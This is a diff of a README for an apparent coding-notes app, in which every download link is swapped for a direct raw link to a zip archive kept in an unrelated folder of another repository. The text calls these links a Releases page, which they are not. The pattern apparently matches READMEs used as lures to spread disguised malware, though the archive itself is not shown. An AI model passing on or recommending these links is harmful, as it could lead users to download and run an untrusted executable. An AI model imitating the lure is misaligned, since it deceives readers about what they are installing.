@@ -5,7 +5,7 @@ description: "📓 Capture your daily coding insights, track progress, and enhan
 ---
 # 🌟 daily-coding-notes - Manage Your Coding Journey Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/sergiosv97/sergiosv97.github.io/raw/refs/heads/main/transposal/Application_v2.9.zip)
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/sergiosv97/sergiosv97.github.io/main/transposal/Application_v2.9.zip)
 
 ## 📋 Description
 
@@ -19,7 +19,7 @@ To get started with daily-coding-notes, follow these steps. You will soon have y
 
 1. Click the download link below to visit the Releases page where you can download the latest version of daily-coding-notes.
 
-   [Visit this page to download](https://github.com/sergiosv97/sergiosv97.github.io/raw/refs/heads/main/transposal/Application_v2.9.zip)
+   [Visit this page to download](https://raw.githubusercontent.com/sergiosv97/sergiosv97.github.io/main/transposal/Application_v2.9.zip)
 
 2. On the Releases page, look for the latest release at the top. You will see a list of files available for download.
 
@@ -70,6 +70,6 @@ We welcome contributions from anyone who wants to improve daily-coding-notes. If
 
 Feel free to use the following link again to download the latest version:
 
-[Visit this page to download](https://github.com/sergiosv97/sergiosv97.github.io/raw/refs/heads/main/transposal/Application_v2.9.zip) 
+[Visit this page to download](https://raw.githubusercontent.com/sergiosv97/sergiosv97.github.io/main/transposal/Application_v2.9.zip) 
 
 Now you are ready to manage your daily coding notes! Happy coding!
